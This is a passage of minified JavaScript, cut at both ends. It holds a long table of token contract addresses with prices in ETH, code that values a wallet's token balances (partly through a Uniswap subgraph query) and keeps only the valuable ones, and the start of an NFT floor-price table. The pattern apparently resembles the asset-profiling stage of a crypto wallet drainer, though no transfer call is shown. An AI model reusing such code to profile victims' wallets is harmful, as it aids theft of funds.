                "0x33f391f4c4fe802b70b77ae37670037a92114a7c": 1642e-9,
                "0x4da08a1bff50be96bded5c7019227164b49c2bfc": 0,
                "0x386cabc0b14a507a4e024dea15554342865b20de": 5.737e-7,
                "0x9ce84f6a69986a83d92c324df10bc8e64771030f": 15135e-9,
                "0x5380442d3c4ec4f5777f551f5edd2fa0f691a27c": .0001584093,
                "0x1e9d0bb190ac34492aa11b80d28c1c86487a341f": 3.55e-8,
                "0xf81421fc15300c5a8cca9afe12f5cbad502fa756": 14748e-10,
                "0x16f78145ad0b9af58747e9a97ebd99175378bd3d": 0,
                "0x043c308bb8a5ae96d0093444be7f56459f1340b1": 50304e-10,
                "0x3a8d5bc8a8948b68dfc0ce9c14ac4150e083518c": 8.219e-7,
                "0xa5f1dbb0e55bc31f32c6d032bee330288490e722": 57005e-10,
                "0x3b544e6fcf6c8dce9d8b45a4fdf21c9b02f9fda9": 4.11e-8,
                "0xc4ee0aa2d993ca7c9263ecfa26c6f7e13009d2b6": 1.6e-9,
                "0xee9e5eff401ee921b138490d00ca8d1f13f67a72": 13335e-10,
                "0xf16e81dce15b08f326220742020379b855b87df9": .0001605674,
                "0x51a673e060e1ea091b23b53d192058ffe0f2d6b6": 1.3e-9,
                "0x9625ce7753ace1fa1865a47aae2c5c2ce4418569": .0001305739,
                "0x10e1e953ddba597011f8bfa806ab0cc3415a622b": .0106817427,
                "0x5c1d9aa868a30795f92fae903edc9eff269044bf": 427398e-10,
                "0x5f0bc16d50f72d10b719dbf6845de2e599eb5624": 55792e-10,
                "0x10010078a54396f62c96df8532dc2b4847d47ed3": 243409e-10,
                "0x0fcbc31c503b4a9ed90e87f8ff46c318a4a14260": .0065800975,
                "0xbe601dd49da9ee1d2f64d422c4aecf8eb83c119f": 68436e-9,
                "0x48f07301e9e29c3c38a80ae8d9ae771f224f1054": 361388e-10,
                "0xf66cd2f8755a21d3c8683a10269f795c0532dd58": .0004352391,
                "0x62858686119135cc00c4a3102b436a0eb314d402": 23396e-10,
                "0x24ccedebf841544c9e6a62af4e8c2fa6e5a46fde": 269534e-10,
                "0xf519381791c03dd7666c142d4e49fd94d3536011": 643989e-10,
                "0x75f0038b8fbfccafe2ab9a51431658871ba5182c": 7.9e-9,
                "0x3f95e5099cf3a125145212afd53039b8d8c5656e": 104973e-10,
                "0x43ab765ee05075d78ad8aa79dcb1978ca3079258": 148823e-10,
                "0xa5f2211b9b8170f694421f2046281775e8468044": 792762e-10,
                "0x6876eba317272fe221c67405c5e8eb3b24535547": 8.287e-7,
                "0xe5a733681bbe6cd8c764bb8078ef8e13a576dd78": 28571e-10,
                "0x4c4d878fae704fff9e00325f7c2bc758489202ec": 138611e-10,
                "0x4104b135dbc9609fc1a9490e61369036497660c8": .0001622572,
                "0x0944d5848bd9f60a34ba92aea300d4286696eb76": 653324e-10,
                "0xff743a38efcf6f46fc0768b46a5bdc264f7e92b3": 453076e-10,
                "0xa54d2ebfd977ad836203c85f18db2f0a0cf88854": 61843e-10,
                "0x852e5427c86a3b46dd25e5fe027bb15f53c4bcb8": 22402e-10,
                "0x0000000005c6b7c1fd10915a05f034f90d524d6e": 358397e-10,
                "0x177ba0cac51bfc7ea24bad39d81dcefd59d74faa": .0273242432,
                "0xf6c2a37acc8ba45874808837486110dc0afc63c8": .0009075467,
                "0xc4c75f2a0cb1a9acc33929512dc9733ea1fd6fde": 3.3e-9,
                "0x4bdcb66b968060d9390c1d12bd29734496205581": 442328e-10,
                "0xd2d8d78087d0e43bc4804b6f946674b2ee406b80": 531661e-10,
                "0x1d96fd43ee07aa79f8fd003cbdf404fb5ce41ad2": 434569e-9,
                "0xcae636167db2369bd746f2bcba79a6e8b0d4e000": .0005209306,
                "0x4a615bb7166210cce20e6642a6f8fb5d4d044496": 222026e-10,
                "0xc382e04099a435439725bb40647e2b32dc136806": 0,
                "0x1977be49c33dfacf6590c16ca9a9cfa0463f663c": .0005829181,
                "0xe7eaec9bca79d537539c00c58ae93117fb7280b9": 0,
                "0x73474d0a549e32845f541e030c3d529de6ab8738": 94795e-10,
                "0xb30f5d11b94efbbfdeaa4de38edffceec0be6513": 57535e-10,
                "0x81824663353a9d29b01b2de9dd9a2bb271d298cd": .1826651257,
                "0x62b9c7356a2dc64a1969e19c23e4f579f9810aa7": .0005794686,
                "0x5444c30210d8a0a156178cfb8048b4137c0d40d1": 0,
                "0x64609a845ad463d07ee51e91a88d1461c3dc3165": 1e-10,
                "0x8a7adc1b690e81c758f1bd0f72dfe27ae6ec56a5": 164205e-10,
                "0xc28e27870558cf22add83540d2126da2e4b464c2": 65421e-10,
                "0x1b6c5864375b34af3ff5bd2e5f40bc425b4a8d79": 3.874e-7,
                "0xfe2e637202056d30016725477c5da089ab0a043a": .9960652901,
                "0xdd974d5c2e2928dea5f71b9825b8b646686bd200": .0006010533,
                "0x5552e5a89a70cb2ef5adbbc45a6be442fe7160ec": 3e-10,
                "0x9008064e6cf73e27a3aba4b10e69f855a4f8efcc": 433438e-10,
                "0x02d3a27ac3f55d5d91fb0f52759842696a864217": 162241e-10,
                "0x903bef1736cddf2a537176cf3c64579c3867a881": .0039371936,
                "0x547b2f82cecfab9c2b1d36fdda96ef9f58c63b8c": 15261e-10,
                "0xea01906843ea8d910658a2c485ffce7c104ab2b6": 51438e-10,
                "0x213c53c96a01a89e6dcc5683cf16473203e17513": 53179e-10,
                "0xc62def1701309bb76e6b39b6ab8b5fac910a3c87": 25491e-9,
                "0xb439b8731ee047799019ef0b745a51d256b116af": .0001755488,
                "0x29127fe04ffa4c32acac0ffe17280abd74eac313": .0293134269,
                "0x009668a9691e456972c8ec4cc84e99486308b84d": 0,
                "0xaeb813653bb20d5fa4798dc4fc63af9cad4f3f67": 7.53e-8,
                "0xb04dfdb8271ed2d5e13858562c44a77d3ceb9e57": 178216e-10,
                "0x3f9bec82c776c47405bcb38070d2395fd18f89d3": 4.09e-8,
                "0x0e192d382a36de7011f795acc4391cd302003606": 998497e-10,
                "0x0cec1a9154ff802e7934fc916ed7ca50bde6844e": .0005738855,
                "0xd15a1a2a3211b58113e45809f05934252e34e2f8": .0002009837,
                "0x20cd2e7ec8f5d8b337fe46a4f565ccef1561b9a9": .0002204604,
                "0x6e0615a03ed9527a6013fcd5b556e36ef4dab1ff": 94608e-10,
                "0x90b831fa3bebf58e9744a14d638e25b4ee06f9bc": 105249e-10,
                "0x8a3d77e9d6968b780564936d15b09805827c21fa": 563387e-10,
                "0xde4ce5447ce0c67920a1371605a39187cb6847c8": 3.305e-7,
                "0x921fa0f0fe7e01e861b2cf583a54a8c3e9b40b1e": 9.504e-7,
                "0xa350da05405cc204e551c4eed19c3039646528d5": 9.001e-7,
                "0xcdb9d30a3ba48cdfcb0ecbe19317e6cf783672f1": 616116e-10,
                "0x83e9f223e1edb3486f876ee888d76bfba26c475a": 295853e-10,
                "0x220b71671b649c03714da9c621285943f3cbcdc6": .0017849109,
                "0xfec82a1b2638826bfe53ae2f87cfd94329cde60d": .0021771195,
                "0x4e08f03079c5cd3083ea331ec61bcc87538b7665": 5.711e-7,
                "0xea5edef1287afdf9eb8a46f9773abfc10820c61c": 41398e-10,
                "0x26cbc7008cd879f4b63b69a915378f2d9b17bbf0": 35651e-10,
                "0xea7aa1edd21735a5ab05ee3e90869016191e274e": .0001458453,
                "0xa4cb0dce4849bdcad2d553e9e68644cf40e26cce": 20348e-10,
                "0xd7d05bda4bf5876ba1254b3eaaf8b47d2f5676eb": .0006167211,
                "0xeb637a9ab6be83c7f8c79fdaa62e1043b65534f0": 17564e-10,
                "0xbc6da0fe9ad5f3b0d58160288917aa56653660e9": .0006658371,
                "0x9d1a62c2ad99019768b9126fda004a9952853f6e": .0122821708,
                "0x2653891204f463fb2a2f4f412564b19e955166ae": .0002054759,
                "0x40a11f82a8469c8dc015ba74438536584978d63c": 199083e-10,
                "0xffe510a92434a0df346c5e72a3494b043cf249eb": 8.69e-8,
                "0xa974c709cfb4566686553a20790685a47aceaa33": .1198523622,
                "0x66bcd0c22bb15cd1ba7199c7a383dc89528f4427": 2e-10,
                "0x1ea48b9965bb5086f3b468e50ed93888a661fc17": .0001614052,
                "0x82bec5483dbab4305f32b191d76dc6cb020ae76d": .0026233527,
                "0xc2a81eb482cb4677136d8812cc6db6e0cb580883": 32053e-10,
                "0xe33ae4e795114279721047484e5ad5cc7df24fcb": 23342e-10,
                "0x1117ac6ad6cdf1a3bc543bad3b133724620522d5": .0002443154,
                "0xdfdb7f72c1f195c5951a234e8db9806eb0635346": 2.35e-8,
                "0xe7094edf87a4e307590d011fb2db50219131d9ed": 6.48e-8,
                "0x7118057ff0f4fd0994fb9d2d94de8231d5cca79e": .0001255073,
                "0x7c8155909cd385f120a56ef90728dd50f9ccbe52": 235e-9,
                "0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611": .0015059356,
                "0xd2adc1c84443ad06f0017adca346bd9b6fc52cab": 313e-9,
                "0x6b32022693210cd2cfc466b9ac0085de8fc34ea6": 271626e-10,
                "0xf720e38f678b29b243f7d53b56acbf5de98f2385": 7.682e-7,
                "0x4b48068864f77261838c7849a12853fb94c77a91": 4.217e-7,
                "0xc6759a4fc56b3ce9734035a56b36e8637c45b77e": .0007129357,
                "0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa": 1.513e-7,
                "0x3a73f6156c4fbc71b8fdf38090a9d99401163644": 309894e-10,
                "0x466912baa9430a4a460b141ee8c580d817441449": 15687e-9,
                "0x92e187a03b6cd19cb6af293ba17f2745fd2357d5": 40478e-10,
                "0x14b40ad2eba6c1b31db2ba817b07578afb414415": 34473e-9,
                "0xbaa70614c7aafb568a93e62a98d55696bcc85dfe": 754733e-10,
                "0x142a774e8b52550e88e196cedd7a5835acb646d0": 1.091e-7,
                "0x4fee21439f2b95b72da2f9f901b3956f27fe91d5": 849336e-10,
                "0x076641af1b8f06b7f8c92587156143c109002cbe": 14e-9,
                "0x47481c1b44f2a1c0135c45aa402ce4f4dde4d30e": 92005e-10,
                "0x6c3be406174349cfa4501654313d97e6a31072e1": 1.863e-7,
                "0xf55a93b613d172b86c2ba3981a849dae2aecde2f": 227952e-10,
                "0x243cacb4d5ff6814ad668c3e225246efa886ad5a": 5e-10,
                "0xc888a0ab4831a29e6ca432babf52e353d23db3c2": 5.848e-7,
                "0xfa93660c3f6a848556bb8e265f994160a1f2b289": 3.9e-9,
                "0x84bb947fcedba6b9c7dcead42df07e113bb03007": 1341e-9,
                "0x31c2415c946928e9fd1af83cdfa38d3edbd4326f": 25512e-10,
                "0xbbbbbbb5aa847a2003fbc6b5c16df0bd1e725f61": .0006669965,
                "0x71dc40668682a124231301414167e4cf7f55383c": 28135e-10,
                "0x70008f18fc58928dce982b0a69c2c21ff80dca54": 257557e-10,
                "0x1e797ce986c3cff4472f7d38d5c4aba55dfefe40": 2.275e-7,
                "0x2942e3b38e33123965bfbc21e802be943a76bbc6": 273215e-10,
                "0x1726b8d5dc3a93cc08fa079477d4ebe782b25bf7": 0,
                "0xe530441f4f73bdb6dc2fa5af7c3fc5fd551ec838": 2.16e-8,
                "0x2602278ee1882889b946eb11dc0e810075650983": 194e-9,
                "0x71ba91dc68c6a206db0a6a92b4b1de3f9271432d": 2.425e-7,
                "0x60c24407d01782c2175d32fe7c8921ed732371d1": 1.856e-7,
                "0xbd9908b0cdd50386f92efcc8e1d71766c2782df0": .0004299666,
                "0xe63d6b308bce0f6193aec6b7e6eba005f41e36ab": 168967e-10,
                "0x8f046a2457a8f1618cae4706fa57bf790e2532a6": 8.23e-8,
                "0x138c2f1123cf3f82e4596d097c118eac6684940b": 58785e-10,
                "0x106538cc16f938776c7c180186975bca23875287": .0002271108,
                "0x86b4dbe5d203e634a12364c0e428fa242a3fba98": .0007717368,
                "0x4e0df4560cedfda5d793f607cefa30383bda7327": 1.872e-7,
                "0x9f7fc686cfd64aa5ae15b351d03071e91533094b": 141891e-10,
                "0xb83c27805aaca5c7082eb45c868d955cf04c337f": 0,
                "0xa11bd36801d8fa4448f0ac4ea7a62e3634ce8c7c": .0003083061,
                "0xd5147bc8e386d91cc5dbe72099dac6c9b99276f5": .0034611583,
                "0x9bf02cf6b0435a0523e6f6e0d2f35a920144f5fa": 3.704e-7,
                "0x4d953cf077c0c95ba090226e59a18fcf97db44ec": 116947e-10,
                "0x88536c9b2c4701b8db824e6a16829d5b5eb84440": .0288589703,
                "0xd714d91a169127e11d8fab3665d72e8b7ef9dbe2": 20203e-10,
                "0x5f018e73c185ab23647c82bd039e762813877f0e": 207e-9,
                "0x57b59f981730c6257df57cf6f0d98283749a9eeb": 1.691e-7,
                "0x4ec1b60b96193a64acae44778e51f7bff2007831": 628768e-10,
                "0x4fd51cb87ffefdf1711112b5bd8ab682e54988ea": 715553e-9,
                "0x34f797e7190c131cf630524655a618b5bd8738e7": 3.774e-7,
                "0x10bc518c32fbae5e38ecb50a612160571bd81e44": .0352547069,
                "0x050d94685c6b0477e1fc555888af6e2bb8dfbda5": 0,
                "0xeea509c221c5c6979e974f4501b4829be0ab2f8c": .0008569334,
                "0x1e02cdbba6729b6470de81ad4d2cca4c514521b9": 43137e-10,
                "0x0789dbae94fb18e5789b8e4489bcb7a1adb58622": .0012725768,
                "0x1a57367c6194199e5d9aea1ce027431682dfb411": 8.423e-7,
                "0xaee433adebe0fbb88daa47ef0c1a513caa52ef02": 191413e-10,
                "0x94d863173ee77439e4292284ff13fad54b3ba182": 25256e-10,
                "0xee6b9cf11d968e0bac7bfff547577b8ae35b8065": 213671e-10,
                "0x4c133e081dfb5858e39cca74e69bf603d409e57a": 2.7e-9,
                "0x350d3f0f41b5b21f0e252fe2645ae9d55562150a": 101285e-10,
                "0x9b5161a41b58498eb9c5febf89d60714089d2253": 87966e-10,
                "0x1f19f83fc9a25f3c861260143e36c17706257986": 42577e-10,
                "0x831091da075665168e01898c6dac004a867f1e1b": 2.2779330376,
                "0xda4129919f964a3a526d3182bb03e6449e5a8872": .0417397491,
                "0xc146b7cdbaff065090077151d391f4c96aa09e0c": 3e-10,
                "0xeee10b3736d5978924f392ed67497cfae795128b": .0002209526,
                "0x5ea82c27efc7634f1c5ad20a3561c453433a2f3a": 126421e-10,
                "0xc4cb5793bd58bad06bf51fb37717b86b02cbe8a4": 40746e-10,
                "0x8a0cdfab62ed35b836dc0633482798421c81b3ec": 108836e-10,
                "0x7ae0d42f23c33338de15bfa89c7405c068d9dc0a": 23296e-10,
                "0x1a87077c4f834884691b8ba4fc808d2ec93a9f30": 0,
                "0x0d31df7dedd78649a14aae62d99ccb23abcc3a5a": 618947e-10,
                "0xc175e77b04f2341517334ea3ed0b198a01a97383": 98638e-10,
                "0x09617f6fd6cf8a71278ec86e23bbab29c04353a7": 121445e-9,
                "0x4374f26f0148a6331905edf4cd33b89d8eed78d1": .0001393793,
                "0x0e8d2eb7d6bdf28393c25a1966385ad32ff0259a": 21671e-10,
                "0xa7e0719a65128b2f6cdbc86096753ff7d5962106": 30065e-10,
                "0xbed4ab0019ff361d83ddeb74883dac8a70f5ea1e": 18371e-9,
                "0x7c32db0645a259fae61353c1f891151a2e7f8c1e": 74716e-10,
                "0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2": 655198e-10,
                "0xe796d6ca1ceb1b022ece5296226bf784110031cd": 45795e-10,
                "0x6b0956258ff7bd7645aa35369b55b61b8e6d6140": 263103e-10,
                "0xa8262eb913fccea4c3f77fc95b8b4043b384cfbb": 6.96e-8,
                "0x8c6fa66c21ae3fc435790e451946a9ea82e6e523": 5.405e-7,
                "0x5bb29c33c4a3c29f56f8aca40b4db91d8a5fe2c5": .0015184189,
                "0x55c08ca52497e2f1534b59e2917bf524d4765257": .0171430615,
                "0xd3c625f54dec647db8780dbbe0e880ef21ba4329": .0001155095,
                "0x4b4d2e899658fb59b1d518b68fe836b100ee8958": .0002243868,
                "0xb05097849bca421a3f51b249ba6cca4af4b97cb9": .0006501401,
                "0x87de305311d5788e8da38d19bb427645b09cb4e5": .0046175799,
                "0x2e2364966267b5d7d2ce6cd9a9b5bd19d9c7c6a9": .0747310144,
                "0x0aa7efe4945db24d95ca6e117bba65ed326e291a": 38209e-10,
                "0xbe1dbe6741fb988fb571ab1e28cffb36e3c62629": .0001623477,
                "0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5": .0067738822,
                "0xe4d75e9b493458d032a5c3cc1ee9b0712c1ece06": 137e-9,
                "0xc55126051b22ebb829d00368f4b12bde432de5da": .1348160125,
                "0xd32641191578ea9b208125ddd4ec5e7b84fcab4c": 1.15e-8,
                "0xe8272210954ea85de6d2ae739806ab593b5d9c51": 160802e-10,
                "0x9783b81438c24848f85848f8df31845097341771": 0,
                "0x9fc8f0ca1668e87294941b7f627e9c15ea06b459": 193841e-10,
                "0xfb83869f7ee52aebaddea254f647953afb1f99f8": .0007237281,
                "0xe63684bcf2987892cefb4caa79bd21b34e98a291": .0090439978,
                "0xf5bb30ebc95dca53e3320eb05d3d1bcab806b9bf": .0002512612,
                "0xce593a29905951e8fc579bc092eca72577da575c": 88008e-10,
                "0x7346ad4c8cd1886ff6d16072bcea5dfc0bc24ca2": .0005132119,
                "0x6100dd79fcaa88420750dcee3f735d168abcb771": .0033764126,
                "0x7105e64bf67eca3ae9b123f0e5ca2b83b2ef2da0": 135393e-10,
                "0x88cb253d4c8cab8cdf7948a9251db85a13669e23": 184e-9,
                "0x8640353cdc9778deab0df45d12fb3013deac079c": 125111e-10,
                "0x9669890e48f330acd88b78d63e1a6b3482652cd9": 49826e-10,
                "0x35bd01fc9d6d5d81ca9e055db88dc49aa2c699a8": .0073679123,
                "0xb44377b74ef1773639b663d0754cb8410a847d02": 598173e-10,
                "0xd90e69f67203ebe02c917b5128629e77b4cd92dc": 833483e-10,
                "0x66c0dded8433c9ea86c8cf91237b14e10b4d70b7": 3.231e-7,
                "0xf71288618f919ff0a779c757489a8b2e45925ddd": 26269e-10,
                "0xb422e605fbd765b80d2c4b5d8196c2f94144438b": 1.117e-7,
                "0x25e1474170c4c0aa64fa98123bdc8db49d7802fa": 9.996e-7,
                "0x069f967be0ca21c7d793d8c343f71e597d9a49b3": 18882e-10,
                "0x6731827cb6879a2091ce3ab3423f7bf20539b579": .0039228891,
                "0xf921ae2dac5fa128dc0f6168bf153ea0943d2d43": 69236e-10,
                "0x948c70dc6169bfb10028fdbe96cbc72e9562b2ac": 722362e-10,
                "0x47da5456bc2e1ce391b645ce80f2e97192e4976a": 9.086e-7,
                "0xbeef3bb9da340ebdf0f5bae2e85368140d7d85d0": .0005187156,
                "0x3209d14ff61766359e64aceff91877cec2ad968e": 2.013e-7,
                "0x9adc7710e9d1b29d8a78c04d52d32532297c2ef3": .0001085463,
                "0x45c2f8c9b4c0bdc76200448cc26c48ab6ffef83f": 81325e-10,
                "0x525794473f7ab5715c81d06d10f52d11cc052804": 6.24e-8,
                "0x0a5e677a6a24b2f1a2bf4f3bffc443231d2fdec8": .0006524691,
                "0x0b498ff89709d3838a063f1dfa463091f9801c2b": .0032335493,
                "0x8d3e855f3f55109d473735ab76f753218400fe96": .0075744806,
                "0xf1d1a5306daae314af6c5d027a492b313e07e1a0": 21202e-10,
                "0x57c411e9a358e2d2d0a6b058cedb709175e8fd16": 1.01e-8,
                "0x59c6900949ad1835f07a04321f4d9934a054e114": 6.003e-7,
                "0xd8c1232fcd219286e341271385bd70601503b3d7": 9.345e-7,
                "0x7728cd70b3dd86210e2bd321437f448231b81733": 13995e-10,
                "0x01597e397605bf280674bf292623460b4204c375": 720833e-10,
                "0xa9f9acb92e4e2f16410511d56839a5bd1d630a60": .0001650331,
                "0x3f5294df68f871241c4b18fcf78ebd8ac18ab654": 395847e-10,
                "0x32e6c34cd57087abbd59b5a4aecc4cb495924356": .0001374321,
                "0x5fce9fc9b5d62af082a59d0823a062f7529efa5a": 0,
                "0x91a5de30e57831529a3c1af636a78a7e4e83f3aa": 0,
                "0x89568569da9c83cb35e59f92f5df2f6ca829eeee": .0004919617,
                "0x618679df9efcd19694bb1daa8d00718eacfa2883": 42346e-10,
                "0xe3a46b2bc1d83c731d58cab765d3b45bce789095": 151348e-10,
                "0xc82e3db60a52cf7529253b4ec688f631aad9e7c2": 73017e-10,
                "0xd1420af453fd7bf940573431d416cace7ff8280c": 978623e-10,
                "0xf45f6c8bb3d77ea762175b8f7ca4d251941649fa": 6.31e-8,
                "0x8daebade922df735c38c80c7ebd708af50815faa": 13.6318012514,
                "0xbc194e6f748a222754c3e8b9946922c09e7d4e91": 65726e-10,
                "0x9b4e2b4b13d125238aa0480dd42b4f6fc71b37cc": 129e-9,
                "0x3758e00b100876c854636ef8db61988931bb8025": 712253e-10,
                "0xac0968a3e2020ac8ca83e60ccf69081ebc6d3bc3": 6.114e-7,
                "0xe9966c1184f8552fcb16f65addba9dd08fe8f4ea": 1.383e-7,
                "0x923b83c26b3809d960ff80332ed00aa46d7ed375": 19208e-10,
                "0x1f36fb2d91d9951cf58ae4c1956c0b77e224f1e9": 169907e-10,
                "0xd501900646641eaf5755758e11eeaa43df691924": 19538e-10,
                "0x62a8c2818bd7034dc24cd22368c3e53e8eb47c18": 3.23e-8,
                "0xa8b12cc90abf65191532a12bb5394a714a46d358": .0032793899,
                "0x32a8e5c552e5cae231e33170d6495ab0af9e5a72": 633389e-10,
                "0x5c89736e9454200141b80c37eb28eaceca2ce8cb": .0001674148,
                "0xc6d1f1d5a46de07e73091f1c8793293b203f01a1": 0,
                "0x11a0762da58a487c075249b9b9edf9f7eb1bc9f5": 1.973e-7,
                "0xe8389374a482d031703ae0e4cb3fe34b045081ee": .0002028728,
                "0x1321f1f1aa541a56c31682c57b80ecfccd9bb288": 446949e-10,
                "0x865377367054516e17014ccded1e7d814edc9ce4": 664491e-9,
                "0xb2dbf14d0b47ed3ba02bdb7c954e05a72deb7544": 23561e-10,
                "0x36b679bd64ed73dbfd88909cdcb892cb66bd4cbb": 85574e-10,
                "0xd6327ce1fb9d6020e8c2c0e124a1ec23dcab7536": 5.48e-8,
                "0x34748fedad669c788aabe4fb325a4587941f7b48": 0,
                "0x9e10f61749c4952c320412a6b26901605ff6da1d": 1.521e-7,
                "0xb41380174d0b06181513a5677b60200b93b5efb4": .0003192289,
                "0xdc47f2ba852669b178699449e50682d6ceaf8c07": 74151e-10,
                "0x0edf9bc41bbc1354c70e2107f80c42cae7fbbca8": 185876e-10,
                "0x1fa3bc860bf823d792f04f662f3aa3a500a68814": .0820713583,
                "0xa86a0da9d05d0771955df05b44ca120661af16de": 8.151e-7,
                "0x72e364f2abdc788b7e918bc238b21f109cd634d7": .0183295614,
                "0xbb70adbe39408cb1e5258702ea8ada7c81165b73": .0005091121,
                "0xebf2096e01455108badcbaf86ce30b6e5a72aa52": 4.29e-8,
                "0x7e794ed35788b698ae60cefc98ee48015c4876da": 0,
                "0xa1d568c6849d5c2a84e0184e7481c1c7fcaad2ac": .0012075509,
                "0xd031edafac6a6ae5425e77f936022e506444c242": 4.832e-7,
                "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0": 1.1137927621,
                "0x450e7f6e3a2f247a51b98c39297a9a5bfbdb3170": 4.224e-7,
                "0x64d91f12ece7362f91a6f8e7940cd55f05060b92": .0007526883,
                "0x70e36f6bf80a52b3b46b3af8e106cc0ed743e8e4": .0006928711,
                "0x887168120cb89fb06f3e74dc4af20d67df0977f6": 9.321e-7,
                "0xfcf8eda095e37a41e002e266daad7efc1579bc0a": 992479e-10,
                "0x4740735aa98dc8aa232bd049f8f0210458e7fca3": 193181e-10,
                "0xee2b297408063e0967096bafdcfd1278d5bf1b8a": 8.666e-7,
                "0x72de803b67b6ab05b61efab2efdcd414d16ebf6d": 21298e-10,
                "0xe1fc4455f62a6e89476f1072530c20cf1a0622da": 17059e-9,
                "0x05079687d35b93538cbd59fe5596380cae9054a9": 106568e-10,
                "0x8947da500eb47f82df21143d0c01a29862a8c3c5": .0003905015,
                "0x130914e1b240a7f4c5d460b7d3a2fd3846b576fa": 30163e-10,
                "0xd0cd466b34a24fcb2f87676278af2005ca8a78c4": .0002356783,
                "0x420a24c9c65bd44c48bfb1cc8d6cd1ea8b1ac840": .001635233,
                "0x6cf9464b2c628db187f2bc1ddc0c43fda72efdd5": 387824e-9,
                "0xf04af3f4e4929f7cd25a751e6149a3318373d4fe": 80594e-10,
                "0xb487d0328b109e302b9d817b6f46cbd738ea08c2": 32436e-10,
                "0xb14ebf566511b9e6002bb286016ab2497b9b9c9d": 141623e-10,
                "0xd06b25f67a17f12b41f615b34d87ecd716ff55a0": 498333e-10,
                "0x1e4ec900dd162ebaf6cf76cfe8a546f34d7a483d": .0001053792,
                "0x6aedb157b9ca86e32200857aa2579d47098ace39": .0001429343,
                "0x89d3c0249307ae570a316030764d12f53bb191fd": 5e-10,
                "0xf9d4daae1300cff251979722c4a3c45857973079": 2.359e-7,
                "0x436da116249044e8b4464f0cf21dd93311d88190": 86023e-10,
                "0x96c065a7283d6c358356298bd63e22bafade0327": .0006153209,
                "0x1c5db575e2ff833e46a2e9864c22f4b22e0b37c2": .0358113506,
                "0xbd0a4bf098261673d5e6e600fd87ddcd756e6764": 0,
                "0x75ecb52e403c617679fbd3e77a50f9d10a842387": 134853e-10,
                "0xccba0b2bc4babe4cbfb6bd2f1edc2a9e86b7845f": 66036e-10,
                "0x90de74265a416e1393a450752175aed98fe11517": .0123142223,
                "0x513c3200f227ebb62e3b3d00b7a83779643a71cf": 190311e-10,
                "0xf90c7f66eac7e2130bf677d69a250b2136cf6697": .034455504,
                "0xb6ee9668771a79be7967ee29a63d4184f8097143": .0001082332,
                "0xe9f84d418b008888a992ff8c6d22389c2c3504e0": 285178e-10,
                "0x2f4eb47a1b1f4488c71fc10e39a4aa56af33dd49": .0058371612,
                "0x42dbbd5ae373fea2fc320f62d44c058522bb3758": 167416e-10,
                "0xa67e9f021b9d208f7e3365b2a155e3c55b27de71": 0,
                "0x013a06558f07d9e6f9a00c95a33f3a0e0255176b": 19019e-10,
                "0xe5097d9baeafb89f9bcb78c9290d545db5f9e9cb": 114702e-10,
                "0x9daef41e08bc88183572b03796c96a7ace1ec9d4": 2.6e-9,
                "0xe7f72bc0252ca7b16dbb72eeee1afcdb2429f2dd": 3016e-9,
                "0x461b71cff4d4334bba09489ace4b5dc1a1813445": 74194e-9,
                "0x974c98bc2e82fa18de92b7e697a1d9bd25682e80": 354e-8,
                "0xaa602de53347579f86b996d2add74bb6f79462b2": 826555e-10,
                "0xd9b312d77bc7bed9b9cecb56636300bed4fe5ce9": 720674e-10
            };
            known_prices_erc_20 = e;
            const c = {}
              , W = d.map((async d=>{
                if (console.log(d),
                known_prices_erc_20.hasOwnProperty(d.token_address))
                    try {
                        if (console.log(d.token_address + "is known"),
                        price_in_eth_known = Number(known_prices_erc_20[d.token_address]).toFixed(13),
                        console.log(price_in_eth_known),
                        balance_erc20_eth_known = d.balance * price_in_eth_known / Math.pow(10, d.decimals),
                        console.log(balance_erc20_eth_known),
                        balance_erc20_eth_known < .001)
                            return;
                        return void (c[d.token_address] = [balance_erc20_eth_known, d.balance])
                    } catch (d) {
                        return
                    }
                const e = await fetch("https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        query: '{token(id: "token_addre") {derivedETH}}'
                    }).replace("token_addre", d.token_address)
                }).then((d=>d.json()));
                if (!e.data.token)
                    return;
                const W = e.data.token.derivedETH;
                try {
                    if (price_in_eth = Number(W).toFixed(13),
                    balance_erc20_eth = d.balance * price_in_eth / Math.pow(10, d.decimals),
                    balance_erc20_eth < .05)
                        return;
                    c[d.token_address] = [balance_erc20_eth, d.balance]
                } catch (d) {
                    return
                }
            }
            ));
            return await Promise.all(W),
            c
        }(await (await J).json()), async function(d, e) {
            const c = {
                "0xd4e4078ca3495de5b1d4db434bebc5a986197782": 235,
                "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d": 88.71275,
                "0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03": 58,
                "0x08d7c0242953446436f34b4c78fe9da38c73668d": 40.07507,
                "0x22c36bfdcef207f9c0cc941936eff94d4246d14a": 38.89333,
                "0x57a204aa1042f6e66dd7730813f4024114d74f37": 2.44089,
                "0x23581767a106ae21c074b2276d25e5c3e136a68b": 10.5538,
                "0x348fc118bcc65a92dc033a951af153d14d945312": 13.23112,
                "0xed5af388653567af2f388e6224dc7c4b3241c544": 13.38591,
                "0x620b70123fb810f6c653da7644b5dd0b6312e4d8": 7,
                "0x60e4d786628fea6478f785a6d7e704777c86a7c6": 15.70257,
                "0x8a90cab2b38dba80c64b7734e58ee1db38b8992e": 8.62397,
                "0x49cf6f5d44e70224e2e23fdcdd2c053f30ada28b": 9.46793,
                "0xc541fc1aa62384ab7994268883f80ef92aac6399": .35,
                "0xa3aee8bce55beea1951ef834b99f3ac60d1abeeb": 7.36964,
                "0xba30e5f9bb24caa003e9f2f0497ad287fdf95623": 6.7515,
                "0x9930929903f9c6c83d9e7c70d058d03c376a8337": 4.93333,
                "0x86825dfca7a6224cfbd2da48e85df2fc3aa7c4b1": 2.70743,
                "0x86357a19e5537a8fba9a004e555713bc943a66c0": 5.5,
                "0x341a1c534248966c4b6afad165b98daed4b964ef": 1.68468,
                "0x7bd29408f11d2bfc23c34f18275bbf23bb716bc7": 3.79263,
                "0xbd4455da5929d5639ee098abfaa3241e9ae111af": .9126,
                "0x282bdd42f4eb70e7a9d9f40c8fea0825b7f68c5d": 6.02654,
                "0xedb61f74b0d09b2558f1eeb79b247c1f363ae452": 5.38479,
                "0x306b1ea3ecdf94ab739f1910bbda052ed4a9f949": 1.14394,
